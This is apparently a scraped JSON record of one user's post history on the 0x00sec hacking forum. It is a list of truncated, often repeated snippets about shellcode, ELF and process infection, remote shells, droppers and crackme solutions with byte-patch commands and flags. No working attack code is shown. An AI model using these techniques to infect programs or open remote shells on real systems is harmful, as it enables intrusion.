{"user": "0x00pf", "history": ["Quality interview!!! I am truly amazed by the community. Great quotes and lessons to be learned from here. Thanks pico! P.S: well-picked title as usual skiddo : )", "Hey all a image a combination arduino and reasberry pi with a full .NETstack;  sounds cool right? I spotted this browsing the internet and thought I would spam it on IRC and here  Seriously though, if the above (minus the spam part sounds interesting), check this out: https://www.kickstarter.com/&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "If you want to understand why/how nmap leaks IPs maybe these post two post may help you to get started: SELFPROMO MODE ON  SELFPROMO MODE OFF  TL;DR;Normal HTTP proxies, as well as SOCKSv4, only support TCP traffic, therefore any nmap flag that requires the transmission of UDP or ICMP packe&hellip;", "These interviews are great! I am new to the community, and this gives me something to strive for!", "I must admit that these interviews are awesome! Keep going  !", "Thats what i thought! \u201cKnowing Null\u201d is great! I love it! Thank you bros", "Awesome to finally get a Knowing Null about @0x00pf, like @pry0cc said, would for sure not be the same without his amazing posts!", "Bro, about damn time. @0x00pf is a long living legend, and he\u2019s given so much to this community. Without members like Pico, this place wouldn\u2019t exist today.", "I knew @0x00pf was an absolute titan but I didn\u2019t know he was actually a God.", "Wonderful interview! I\u2019m still new to the community, and though I\u2019ve done plenty of research myself I\u2019d say I\u2019m just getting my foot in the door in regards to hacking, so it\u2019s nice to see things like this that help to give newcomers like me perspective on where I am and where life could lead me. T&hellip;", "Awesome to finally get a Knowing Null about @0x00pf, like @pry0cc said, would for sure not be the same without his amazing posts!", "Bro, about damn time. @0x00pf is a long living legend, and he\u2019s given so much to this community. Without members like Pico, this place wouldn\u2019t exist today.", "I knew @0x00pf was an absolute titan but I didn\u2019t know he was actually a God.", "Hello again!It\u2019s been a while since the last Knowing Null. For those of you knew to the series, my name is skidd0 and Knowing Null is an interview series where I pester and prod the top minds of 0x00sec about themselves and then post it all publicly\u2013a dream come true for us paranoid hackers! Today&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "I guess you have heard about the Mirai BotNet. Everybody was talking about it because of some massive DDoS from IoT devices. Then, early this month, its source code was released: Finally, I manage to take a look to the source code and\u2026 there is a lot of interesting stuff in there!!! Take a look &hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "It looks more like this: Super Stealthy Droppers, but loading a library, instead of running a binary", "I just wanted to thank everyone for helping this essay get widely distributed. Especially @pry0cc. And for everyone who is a part of 0x00sec.org: I have been in this game for awhile now. I pretty much kept to myself for years\u2026however, I believe our world is facing issues that we can only fix toget&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Thanks @yogi4you!. I\u2019m glad to hear you liked the series. I\u2019ve been very busy lately, I\u2019ll try my best to continue the series whenever things calm down. Also regarding your initial question, there are many different ways to generate the asm out of an hex sequence. rasm2 tool included in radare2 is &hellip;", "Hi @yogi4you Check for instance this post: And this The links in this page may also help to understand that string", "Thanks @yogi4you!. I\u2019m glad to hear you liked the series. I\u2019ve been very busy lately, I\u2019ll try my best to continue the series whenever things calm down. Also regarding your initial question, there are many different ways to generate the asm out of an hex sequence. rasm2 tool included in radare2 is &hellip;", "Thanks @yogi4you!. I\u2019m glad to hear you liked the series. I\u2019ve been very busy lately, I\u2019ll try my best to continue the series whenever things calm down. Also regarding your initial question, there are many different ways to generate the asm out of an hex sequence. rasm2 tool included in radare2 is &hellip;", "Thanks @yogi4you!. I\u2019m glad to hear you liked the series. I\u2019ve been very busy lately, I\u2019ll try my best to continue the series whenever things calm down. Also regarding your initial question, there are many different ways to generate the asm out of an hex sequence. rasm2 tool included in radare2 is &hellip;", "Thanks for the above links. And I\u2019ve read your \u201cProgramming for Wannabes\u201d series. It\u2019s brilliant. Please continue that series, it\u2019s been a long time since your last post.", "Hi @yogi4you Check for instance this post: And this The links in this page may also help to understand that string", "Hi @yogi4you Check for instance this post: And this The links in this page may also help to understand that string", "Hi @yogi4you Check for instance this post: And this The links in this page may also help to understand that string", "Thanks for the above links. And I\u2019ve read your \u201cProgramming for Wannabes\u201d series. It\u2019s brilliant. Please continue that series, it\u2019s been a long time since your last post.", "Hi @yogi4you Check for instance this post: And this The links in this page may also help to understand that string", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "I promise to write this many months ago, and finally I found some time to do it. Even when a VPN is not really a hacker tool, it is commonly used to make tracing more difficult and to increase privacy and anonymity. We have talked a lot about VPNs from a user point of view but not much about how the&hellip;", "Thanks mate! I\u2019m glad to contribute to this nice community!", "Thanks\u2026 Glad to hear you like it", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Realmode Assembly - Writing bootable stuffPart 7: Let\u2019s write a small game (2/2)What is this?This is going to be a walk-through in writing an Operation System in assembly which operates purely in Realmode. Goal will be writing different kernels from a simple \u201cHello World\u201d over small terminal pr&hellip;", "Note: Multiple edits for typos (the ghost of a learning disability mostly overcome) and additional image upload occurred between 21:10 EST, 9/30/18 &amp; 22:23 EST 9/30/18 Last year I released the essay Shared thoughts after 6+ years in pentesting: (Shared thoughts after 6+ years in Pentesting). I dec&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Everyone give a big hands up, thump up, sexual massage or big lovin to our resident matey boy @Leeky for REKIN flare-on check his scores!  [ef3090676d0c76993e98ca1c3504629b]Leeky&gt; 250 hours over 2 months! I have never been so sore but it was worth it in the end, even if it did end up so sticky L&hellip;", "That is not always the case, but it is true that is the most common case. This is actually platform/processor dependant.", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "Hey all a small c# challenge RE I made for leeky and lkw on IRC, they appeared to like it! so I thought I would post it here. My first try at writing one of these so feedback welcome  https://1drv.ms/u/s!AkvwG6Qrk79x3Th-paeLebwfmC_y Good luck have fun  The archive type is 7zip availible here: ht&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "Since I haven\u2019t been so active in the past few months because of my lack of time, I\u2019m coming back with some new knowledge to spread around. The 0x00sec drone is on the way to be accomplished right? So why not understand how drones generally work and even build your own. Disclaimer: All the informat&hellip;", "Yesterday, I joined the 0x00sec IRC channel and, as many other times, @dtm come up with an interesting concept\u2026 and I had to try. The idea was pretty challenging and I have not completely come up with a full implementation but I manage to get a minimal Proof of Concept program to illustrate the conc&hellip;", "DISCLAIMER: Article originally published on immunIT. Hi fellas, Today, I will introduce you to a new tool, developed for the sake of one of my pentesting engagement, named XIP. XIP claims to provide an efficient way to generate a list of IP addresses, using a set of mutations, in order to bypas&hellip;", "I fully agree with @oaktree. That said, these are my 2 cents: Malware. Malware heavily relies on low-level use of OS features, sometimes hidden features. As major OSes  provide a C interface, that is the natural language to interact with it. Otherwise you will probably end up adding C++ wrappers &hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I\u2019m posting it here. I\u2019d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "Sorry for the late reply. Glad you got it working! I got a version working with PIE (Position-Independent Executables), where the you don\u2019t set the entry point statically, but by offset. It\u2019s a while a go, but you\u2019re welcome to check it the code.", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Hi @bramble, Thanks for reading my tutorial hope you enjoyed it and find it somehow useful. This is just a XOR that will be 0 whenever both values v and pat are equal. It is just a way to check if you have found the pattern you are looking for. That is probably the case. The best way to find ou&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "The thesis I presented for my diploma was about physical security, with BadUSB devices taking the most amount of pages. I saw there\u2019s already a pretty good post on how to make your own BadUSB starting from a vulnerable stick (click) but I\u2019d like to make another contribution in the same subject by pr&hellip;", "Heya everybody!Today, I bring you another Knowing Null Interview with the man you all voted for: fraq! Be sure to stick around after the interview to vote for the next subject. If there\u2019s a question you\u2019d like to see asked in future features, go ahead and leave a comment or ping me on IRC. Here. &hellip;", "Welcome Back to Knowing Null!This week, you voted to bring in ricksanchez! Let\u2019s just jump right into it.First, I\u2019d like to thank you for joining this series of course, anytime  If people really feel the urge to get toknow more about me this is the perfect chance! Can you tell me and the read&hellip;", "Hi @bramble, Thanks for reading my tutorial hope you enjoyed it and find it somehow useful. This is just a XOR that will be 0 whenever both values v and pat are equal. It is just a way to check if you have found the pattern you are looking for. That is probably the case. The best way to find ou&hellip;", "@slevin  in the comments you seemed to off ran into the same issues? i attempted with ur payload with the same results. Or am i missing something?(in terms of theory) I would greatly appreciate it if you, or @0x00pf  could help me out? No worries if you guys can\u2019t and thanks for the time. ^.^", "Great post @Leeky! As discussed yesterday on IRC\u2026 this is slight modification poking the video memory instead of using the slow BIOS  org 0x8000bits 16push  0xb800pop   es     ; Set ES to the Video Memory;; Clear screenmov ax, 0x1000    ; Clean screen blue backgroundcall  cls;; Pri&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Hey guys, back with just another casual article from me this time around since one of my projects failed miserably and I don\u2019t really have the time for another serious one. Also I\u2019ve getting into something new, as you may have already guessed, kernel-mode development! Yeah, pretty exciting stuff and&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "The hardest GNU/Linux reverse engineering in the 0x00sec CTF 2017 event was OBFTEANATION. Only 2 person solved this challenge during the competition, so I guess some of you have been waiting for this write up. I just wrote it to be hard but I didn\u2019t try to solve it myself until now. Of course it is&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Hey guys, as you may or may not know, I developed an application dubbed \u201cNoREpls\u201d for the purposes of teaching Windows reverse engineering as a side project. It\u2019s been a while since its debut here so I\u2019ve decided to finally upload its source on my GitHub page here: https://github.com/NtRaiseHardErro&hellip;", "In this paper I will present an elegant technique (it\u2019s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability. Setting your envi&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Some weeks ago I found [this interesting article] (https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html), about injecting code in running processes without using ptrace. The article is very interesting and I recommend you to read it, but what caugh&hellip;", "Hi @WhiteCollar The system function actually executes /bin/sh -c command (see the man page). An sh: 1 something means that you have successfully called system but with the wrong parameter. Whatever follows the sh: 1 is what you have tried to execute\u2026 that may be non-printable garbage. Said that, a&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Hello fellow nerds, today I have decided to write a little article about my journey in resolving the Red Triangle ARG. So here we are ! Getting startedOnce you open the link you are prompted with a Red triangle on top, some hex encoded text below, a nice music played and 3 images: Two of them ha&hellip;", "Hello folks, today I\u2019m going to continue The Red Triangle series. If you haven\u2019t seen the first one yet, you can check it here:  [ARG] The Red Triangle Solving \u2014 Part 1 Last time, we have deciphered the Monoalphabetic Substitution symbols from the images and got a link to google drive, that lead u&hellip;", "It is amazing how a so old code is still interesting to study. You have to be careful as some things have change since that time and you need to do a little bit research to understand why some code is there. I will also recommend to take a look to the main (worm.c) function. It makes use of some tr&hellip;", "If we check the .dynsym sections again in readelf we can see that strcmp@GLIBC_2.0 is actually there but the .rel.plt section looks a bit cranky. We gotta fix that first  puts Info field with the correct value. In our case there should be an Info 00000107 instead of the 00000407  Relocation sectio&hellip;", "Worked on a solution using LIEF  https://github.com/cedriczirtacic/stuff/tree/master/CTFs/0x00sec/BabyELF", "What fitting challenges  \u2026 This one is about patching the right index for the string table in the st_name field in the .dynsym section for the second puts call. When looking at the assembly code the second puts looks more like an intended strcmp with the loading of \u2018kek\u2019 in the register  right bef&hellip;", "I\u2019m curious about the 4 bits patch. This is a basic 1 byte patch. Hope to get some time to look for the 4bits solution echo -ne \u201c\\x26\u201d | dd of=test1 seek=$((0x2b8 + 0x78)) bs=1 count=1 conv=notrunc", "I\u2019m a bit sad that I didn\u2019t found an alternative solution, but whatever. Was fun  echo -ne \u201c\\x01\u201d | dd of=babyelf_revenge seek=781 bs=1 count=1 conv=notrunc with the \u201cpassword\u201d of \u201ckek\u201d.", "Thank you for the feedback! I figured code patching has already been quite overused in crackmes so why not add a twist that requires a different kind of binary mastery  Good job on solving it!", "Thanks for the challenge mate. Pretty cool. I believe it is actually a 2 bits patch . echo -ne \u201c\\x01\u201d | dd of=test1 seek=$((0x308 + 0x5)) bs=1 count=1 conv=notrunc I believe I just get home earlier than @Leeky", "The ELF wizard strikes back!  Indeed the intended patch is 2 bits but I thought I\u2019d be really messing with someone\u2019s creativity/mind if I were to be that precise. Clean and elegant solution as always. I give up on trying to trick you with ELF shenanigans", "Thanks for the challenge mate. Pretty cool. I believe it is actually a 2 bits patch . echo -ne \u201c\\x01\u201d | dd of=test1 seek=$((0x308 + 0x5)) bs=1 count=1 conv=notrunc I believe I just get home earlier than @Leeky", "Thanks for the challenge mate. Pretty cool. I believe it is actually a 2 bits patch . echo -ne \u201c\\x01\u201d | dd of=test1 seek=$((0x308 + 0x5)) bs=1 count=1 conv=notrunc I believe I just get home earlier than @Leeky", "BabyELF RevengeDescriptionA BabyELF sequel since @0x00pf and @Leeky  nailed it in no time (I hope this one cannot be solved the same way ). RulesMake the binary display Congrats!Patch more than 4 bits and you\u2019re disqualified. Don\u2019t patch any instruction!Binarybase64 -d dump | gunzip &gt; &hellip;", "@Leeky and @0x00pf solved it in no time? hmmmm\u2026 I might just look into the first one aswell.", "BabyELF RevengeDescriptionA BabyELF sequel since @0x00pf and @Leeky  nailed it in no time (I hope this one cannot be solved the same way ). RulesMake the binary display Congrats!Patch more than 4 bits and you\u2019re disqualified. Don\u2019t patch any instruction!Binarybase64 -d dump | gunzip &gt; &hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "I see, glad to see that I haven\u2019t missed something obvious  BTW, thanks for the challenge mate. I love the smell of .dynsym in the morning", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "I see, glad to see that I haven\u2019t missed something obvious  BTW, thanks for the challenge mate. I love the smell of .dynsym in the morning", "oops\u2026 Directly added those to the sources section! How could I not have known that these exist!", "Oopsie! I had made a previous demo whose strings in the string table differed in distance so little that required 4-bit patching. Updated the description  Congrats on patching  .dynsym like a boss", "I\u2019m curious about the 4 bits patch. This is a basic 1 byte patch. Hope to get some time to look for the 4bits solution echo -ne \u201c\\x26\u201d | dd of=test1 seek=$((0x2b8 + 0x78)) bs=1 count=1 conv=notrunc", "oops\u2026 Directly added those to the sources section! How could I not have known that these exist!", "Great post @ricksanchez! You can go a bit farther using C (Programming for Wannabes. Part II)\u2026 but we all know C is for wimps  Also this   The Price of Scripting: DietLibC vs ASM \u2026 we had the same idea! Congrats!", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Great post @ricksanchez! You can go a bit farther using C (Programming for Wannabes. Part II)\u2026 but we all know C is for wimps  Also this   The Price of Scripting: DietLibC vs ASM \u2026 we had the same idea! Congrats!", "I\u2019m curious about the 4 bits patch. This is a basic 1 byte patch. Hope to get some time to look for the 4bits solution echo -ne \u201c\\x26\u201d | dd of=test1 seek=$((0x2b8 + 0x78)) bs=1 count=1 conv=notrunc", "BabyELF                        _..--&quot;&quot;&quot;&quot;--...___                 .---,                      ,&#39; \\               `&#39;--.___        /   /                     /`\\  \\                      ``&#39;&#39;--:&#39;`--&#39;                    (  ,&#39;. &#39;.              _____..--&#39;&#39;`                    )__/`-&#39;._;__       .-&#39;`  &hellip;", "PrefaceHi folks! For quite some time there was no article from my side. Life kept me busy with all sorts of things, but here is a little something until some cooler project emerges  . This article will focus on explaining the ELF file format. While this may seem like a really boring and very th&hellip;", "PrefaceHi folks! For quite some time there was no article from my side. Life kept me busy with all sorts of things, but here is a little something until some cooler project emerges  . This article will focus on explaining the ELF file format. While this may seem like a really boring and very th&hellip;", "me too i also want to see @0x00pf", "As already said in IRC yesterday: great idea @skidd0 ! I think it\u2019ll help to create somewhat of an identity behind the of pseudonym which is nice  I gladly take part in the interview if people want to know. Otherwise adding @0x00pf, @sprtn and @zSec to the vote is a must for sure. We probably are&hellip;", "Who are these scrublings? I want to see @0x00pf.", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "@fraq has dropped a bunch of concepts here that may be confusing for people not familiar with communications systems. So I will try, with @fraq\u2019s permission, to expand a bit further. Sure. I like these topics  As @fraq said, that elephant thingy is related to mechanical waves, like sound, not elect&hellip;", "Was fun!  VM{LooP_tH3_l00p}", "I believe many of us have read that book. It is a great book! https://0x00sec.org/t/hacking-related-books/849", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Let\u2019s go on with our special ASM/C programming course. At this point, we roughly know how a computer works, its main components, what is machine code, what is assembly code and how to compile simple programs for a few architectures. In this part we are going to write our first shellcode. Yes, we ar&hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Programming Turing Machines: IntroductionBack again with another theory-heavy topic!  The project I\u2019ve been working on is quite extensive so it will be split into three parts: IntroductionImplementationHigh-level ApproachAs these topics are created, they will be linked together for easy navig&hellip;", "Programming Turing Machines: ImplementationTo continue where we left off from the previous topic, I will begin discussing my Python implementation of a Turing machine.  The fun part about implementation is that you don\u2019t always have to be as explicit as you do when defining a model mathematically. &hellip;", "Programming Turing Machines: High-level approachIf you\u2019ve got the hang of Turing machine procedures down, at this point you should be able to write your own with relative ease.  If you aren\u2019t comfortable with them yet, revisit the last section of the previous topic (feel free to use the comments se&hellip;", "Good day all, I have a fun project I would like to invest some time into and am interested if anyone would like to join me on the voyage. Quite simply it is an extension of a honeypot, though one with an odd response. When an inbound attack is sent it is caught and run through an engine I will de&hellip;", "I\u2019d say that is a Pull-up/down resistor.", "I\u2019d say that is a Pull-up/down resistor.", "Ah yes, debouncing (which I did not cover), I believe the ohm resistor I used helps with this as well, just for some added extra info for people reading this post.", "@SmartOne As far as I know a button is just a button. The button used in the post looks like a push-button or more specifically a momentary push button (because it comes back to the original position when you stop pushing it). This kind of button are usually switches with a spring. When you push i&hellip;", "@SmartOne As far as I know a button is just a button. The button used in the post looks like a push-button or more specifically a momentary push button (because it comes back to the original position when you stop pushing it). This kind of button are usually switches with a spring. When you push i&hellip;", "@SmartOne As far as I know a button is just a button. The button used in the post looks like a push-button or more specifically a momentary push button (because it comes back to the original position when you stop pushing it). This kind of button are usually switches with a spring. When you push i&hellip;", "Similar to my previous crackme, another test application for a personal project that I am developing. DifficultyAuthor Assigned Level: \u00af\\_(\u30c4)_/\u00afCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters ObjectiveFind the correct key.Rules of EngagementNone.Binary&hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "My Introduction First, I would like to thank 0x00sec for providing such a great community. I would also like to thank Arrogant Bastard, Sierra Nevada and Deathwish Coffee for providing the sustenance necessary for starting and completing the following series. Not only should you get drunk while com&hellip;", "Use send() instead of sr1().", "Finally managed to finish it too  $ ./crackme VM{M4TR1X} Congratulations! You did it!", "We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processe&hellip;", "Was fun!  The flag is VM{M4TR1X}", "This is a PoC-style test run for an application that I am currently developing as a personal project. Should anything weird happen, please report it to me and I\u2019ll try to fix it. This is just a simple crackme so it shouldn\u2019t be too hard once you start to figure out what\u2019s happening\u2026 maybe\u2026?  Diffic&hellip;", "Well, I would make a pull request, but it seems github just flagged my account. Guess they don\u2019t like privacy settings. I contacted them, but not sure how long it will take for them to review it. I\u2019ll try to do that when/if they let me back on. lol", "Well, I would make a pull request, but it seems github just flagged my account. Guess they don\u2019t like privacy settings. I contacted them, but not sure how long it will take for them to review it. I\u2019ll try to do that when/if they let me back on. lol", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "Now you can try to make it work with PIE binaries. Hint:  Check /proc/PID/maps to figure out the real address at run-time. Do not forget to make a PR on my repo if you make it work", "I found \u2018-no-pie\u2019 wasn\u2019t in the Makefile from the github, but added it like so: $ cat Makefile all:prog crypter_rt polycrypt crypter_rt:crypter_rt.c ${CC} -no-pie -Wall -o $@ $&lt; prog:prog.c ${CC} -no-pie -Wall -o $@ $&lt; polycrypt:polycrypt.c ${CC} -no-pie -Wall -o $@ $&lt; .PHONY: clean: rm p&hellip;", "compiled fine for me with gcc with no flags", "Hi @ph33r Looks like the error you are actually getting is ENOMEM (check the mprotect man page for details). This normally means that the address you are passing as a parameter is wrong. So my best guess is that you have generated a PIE binary. To play with program compile it as a normal binary (-&hellip;", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "Those of you that are following me on twitter may have heard about STAN. This is my pet project to learn about reverse engineering. It was born as an experiment with the capstone disassembly framework (http://www.capstone-engine.org/), and it evolved in something usable for simple projects. If you &hellip;", "ARM Crackme - Data Processing@Wunkolo and I have decided that there aren\u2019t enough ARM crackmes on the forum and that we should add a few for people that are interested in learning how the architecture works and for those that just want to show their skills  We will start very easy with some challe&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "If you have been following this series, you may remember that I started Part I with an use case involving remote access to an Android Phone. This part will cover how to get a remote shell access to your phone and other devices. Actually, deploying our remote shells in a device is nothing special, b&hellip;", "In Part I of this series we learn how to enable a very basic remote shell access to a machine. In this second part we are going to modify the code to support some level of manipulation of the data transmitted over the link. Specifically, we are going to encrypt the data stream\u2026 :o LEVEL: Beginner H&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "I was thinking that a pickle (or otherwise serialized) version of this technique could be used as a extremely stealthy payload for an serialization exploit. Either that or if there is python command/code injection this could be one-liner\u2019d over to take advantage of currently loaded imports to get st&hellip;", "It looks more like this: Super Stealthy Droppers, but loading a library, instead of running a binary", "Hi  @0x00pf thank you so much that probably that\u2019s probably one of the best advice i have got its means a lot for me   thanks.", "Hi  @0x00pf thank you so much that probably that\u2019s probably one of the best advice i have got its means a lot for me   thanks.", "Hi @haalim, Thanks for reading my posts. I\u2019m glad to hear they were useful  Answering your questions:  actually, if you feel like that, it means that you are going in the right direction. Take that as an indication that you are doing well. Whenever you believe that you know everything, that usua&hellip;", "PrefaceThis quick article will give a short introduction on what fuzzers are, how they work and how to properly setup the afl - american fuzzy lop fuzzer to find flaws in arbitrary projects. Well known alternatives to afl (for the same or other purposes): boofuzz: Network Protocol Fuzzing for Hu&hellip;", "Hi @haalim, Thanks for reading my posts. I\u2019m glad to hear they were useful  Answering your questions:  actually, if you feel like that, it means that you are going in the right direction. Take that as an indication that you are doing well. Whenever you believe that you know everything, that usua&hellip;", "Hi @haalim, Thanks for reading my posts. I\u2019m glad to hear they were useful  Answering your questions:  actually, if you feel like that, it means that you are going in the right direction. Take that as an indication that you are doing well. Whenever you believe that you know everything, that usua&hellip;", "Hi all, hope everyone is fine I already post my introduction but those of you how don\u2019t know me i am just a teenager who love to learn about the computers. It\u2019s has been more than a month since i joined 0x00Sec and i learn so much  i learn about the basic of programming and how things 